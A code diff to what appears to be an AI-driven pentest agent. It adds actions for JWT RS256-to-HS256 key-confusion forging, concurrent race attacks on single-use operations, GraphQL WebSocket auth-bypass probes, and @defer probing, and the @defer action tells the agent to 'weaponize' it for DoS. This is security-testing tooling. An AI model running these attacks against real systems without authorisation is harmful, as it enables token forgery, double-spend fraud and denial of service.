@@ -123,6 +123,15 @@ def _autotest_token_sinks(ctx: ActionContext, token: str, approach: str,
     return lines
 
 
+def _resolve_pubkey_pem(ctx: ActionContext) -> str | None:
+    """Best-effort fetch of the target's RSA public key (JWKS) for RS256->HS256 confusion."""
+    from ...utils import jwt_attacks
+    try:
+        return jwt_attacks.fetch_rsa_pubkey_pem(ctx.target_url, getattr(ctx.client, "session", None))
+    except Exception:  # noqa: BLE001
+        return None
+
+
 @action("forge_jwt")
 def handle_forge_jwt(ctx: ActionContext, args: dict) -> Result:
     try:
@@ -133,6 +142,14 @@ def handle_forge_jwt(ctx: ActionContext, args: dict) -> Result:
         if ("weak" in a or "secret" in a) and not secret:
             obs = _forge_weak_secret_dictionary(ctx, claims)
         else:
+            if ("confus" in a or "rs256" in a) and not secret:
+                secret = _resolve_pubkey_pem(ctx)
+                if not secret:
+                    obs = ("forge_jwt confusion: couldn't auto-fetch the server's RSA public key "
+                           "(no JWKS at common paths). Pass it as secret:'<PEM>' - RS256->HS256 "
+                           "HMAC-signs with the EXACT public-key PEM the server verifies RS256 with.")
+                    ctx.log(f"[{ctx.step}] forge_jwt -> {obs[:120]}")
+                    return Result(observation=obs)
             token = tool_forge_jwt(approach, secret, claims, ctx.harvested)
             ctx.harvested.setdefault("forged_jwt", []).append(token)
             tested = _autotest_token_sinks(ctx, token, approach)
@@ -326,3 +343,120 @@ def handle_csrf(ctx: ActionContext, args: dict) -> Result:
     obs = " | ".join(lines)
     ctx.log(f"[{ctx.step}] csrf -> {obs[:700]}")
     return Result(observation=obs[:700])
+
+
+@action("race")
+def handle_race(ctx: ActionContext, args: dict) -> Result:
+    """Fire ONE operation N times simultaneously to test for a concurrency/TOCTOU race.
+
+    Set up the single-use state FIRST (a one-time coupon, a balance to over-withdraw, an OTP, a
+    unique value), then race the redeeming/withdrawing/claiming mutation. Reports how many raced
+    copies succeeded with no serializing error; advisory (the model judges single-use semantics).
+    """
+    query = str(args.get("query", "")).strip()
+    template = str(args.get("template", "")).strip()
+    if not query and template:
+        v = (args.get("values") or [""])[0]
+        query = template.replace("{V}", str(v))
+    if not query:
+        return Result(observation="race needs {query} (the single-use op to race) or {template, values}. "
+                      "Set up the state first, then race the redeem/withdraw/claim mutation.")
+    variables = args.get("variables") if isinstance(args.get("variables"), dict) else None
+    n = max(2, min(int(args.get("n", 20) or 20), 50))
+    sess = getattr(ctx.client, "session", None)
+    try:
+        from ...utils.racer import analyze_race, run_race
+        results = run_race(ctx.target_url, query, variables, dict(ctx.identity or {}), n=n,
+                           verify=getattr(sess, "verify", True), proxies=getattr(sess, "proxies", None))
+    except Exception as e:  # noqa: BLE001
+        obs = f"race failed: {str(e)[:120]}"
+        ctx.log(f"[{ctx.step}] race -> {obs}")
+        return Result(observation=obs, touched_target=True)
+    a = analyze_race(results)
+    ctx.interactions.append({"target_node": "race", "reason": "agent_race", "response_status": 0,
+                             "score": 0.0, "timestamp": datetime.now(timezone.utc).isoformat()})
+    if a["possible_race"]:
+        obs = (f"⚠ POSSIBLE RACE: {a['succeeded']}/{a['total']} concurrent copies SUCCEEDED with NO "
+               f"rate-limit/duplicate/insufficient error - the op has no concurrency control. If this "
+               f"operation is SINGLE-USE (one-time coupon, withdrawal past balance, OTP, unique signup), "
+               f"that is a limit-overrun/double-spend race - verify the effect (e.g. coupon applied twice, "
+               f"balance went negative) then report_finding. If it's idempotent/read-only, it's not a bug.")
+    else:
+        obs = (f"race: {a['succeeded']}/{a['total']} succeeded, {a['blocked']} blocked (rate-limit/duplicate/"
+               f"insufficient), {a['errored']} errored - the server appears to SERIALIZE or limit this op; "
+               f"no clean race. Ensure you raced a single-use state-changing op, not a plain read.")
+    ctx.log(f"[{ctx.step}] race ×{n} -> {obs[:160]}")
+    return Result(observation=obs, touched_target=True)
+
+
+def _first_subscription_field(schema_map: dict) -> str | None:
+    sroot = schema_map.get("_subscription_type") or ""
+    fields = schema_map.get(sroot)
+    if isinstance(fields, dict):
+        real = [f for f in fields if not str(f).startswith("_")]
+        return real[0] if real else None
+    return None
+
+
+@action("subscribe")
+def handle_subscribe(ctx: ActionContext, args: dict) -> Result:
+    """Probe GraphQL subscriptions over WebSocket - the transport the HTTP loop can't drive.
+
+    Tests legacy-subprotocol downgrade, pre-handshake auth bypass (subscribe before connection_init),
+    and unauthenticated data flow over a subscription. args {field?} overrides the schema's first
+    subscription field.
+    """
+    from ...utils.gqlws import probe_subscriptions
+    field = str(args.get("field", "")).strip() or _first_subscription_field(ctx.schema_map)
+    try:
+        result = probe_subscriptions(ctx.target_url, dict(ctx.identity or {}), sub_field=field)
+    except Exception as e:  # noqa: BLE001
+        obs = f"subscribe probe failed: {str(e)[:120]}"
+        ctx.log(f"[{ctx.step}] subscribe -> {obs}")
+        return Result(observation=obs, touched_target=True)
+    for vt, evidence in result.get("findings", []):
+        ctx.record(vt, "subscription", evidence, 3.0)
+    ctx.interactions.append({"target_node": "subscribe", "reason": "agent_subscribe",
+                             "response_status": 0, "score": 0.0,
+                             "timestamp": datetime.now(timezone.utc).isoformat()})
+    head = ("⚠ " + "; ".join(vt for vt, _ in result["findings"]) + "\n  "
+            if result.get("findings") else "")
+    obs = head + " | ".join(result.get("observations", [])) or "no WS observations"
+    ctx.log(f"[{ctx.step}] subscribe -> {obs[:200]}")
+    return Result(observation=obs[:700], touched_target=True)
+
+
+@action("defer")
+def handle_defer(ctx: ActionContext, args: dict) -> Result:
+    """Probe @defer/@stream incremental delivery (DoS-amplification / response-desync / deferred-authz surface).
+
+    args {query?} - your own @defer query, else one is auto-built over an object-returning root field.
+    """
+    from ...utils.deferprobe import build_defer_query, probe_defer
+    query = str(args.get("query", "")).strip() or build_defer_query(ctx.schema_map)
+    if not query:
+        return Result(observation="defer: no @defer query given and no object-returning root field to "
+                      "auto-build one - pass query:'query { field { ... @defer { sub } } }'.",
+                      touched_target=False)
+    try:
+        r = probe_defer(ctx.target_url, query, session=getattr(ctx.client, "session", None),
+                        headers=dict(ctx.identity or {}))
+    except Exception as e:  # noqa: BLE001
+        obs = f"defer probe failed: {str(e)[:120]}"
+        ctx.log(f"[{ctx.step}] defer -> {obs}")
+        return Result(observation=obs, touched_target=True)
+    ctx.interactions.append({"target_node": "defer", "reason": "agent_defer", "response_status": 0,
+                             "score": 0.0, "timestamp": datetime.now(timezone.utc).isoformat()})
+    if r.get("supported"):
+        ctx.record("Incremental Delivery Enabled (@defer/@stream)", "endpoint",
+                   f"server streamed an incremental response (content-type {r.get('content_type')}, "
+                   f"markers {r.get('markers')}) - a DoS-amplification (many deferred fragments -> many "
+                   f"chunks / long-lived stream), response-desync, and deferred-field-authz surface.", 2.0)
+        obs = (f"⚠ @defer/@stream SUPPORTED (multipart={r.get('multipart')}, ct={r.get('content_type')}). "
+               f"Now weaponize: (1) DoS - many `... @defer` fragments over large lists; (2) AUTHZ - put a "
+               f"sensitive field behind @defer and check it leaks even when the top-level is gated.")
+    else:
+        obs = (f"@defer not supported (HTTP {r.get('status')}, ct={r.get('content_type')}) - the server "
+               f"returned a normal response, not multipart/incremental. {r.get('detail', '')[:120]}")
+    ctx.log(f"[{ctx.step}] defer -> {obs[:160]}")
+    return Result(observation=obs, touched_target=True)
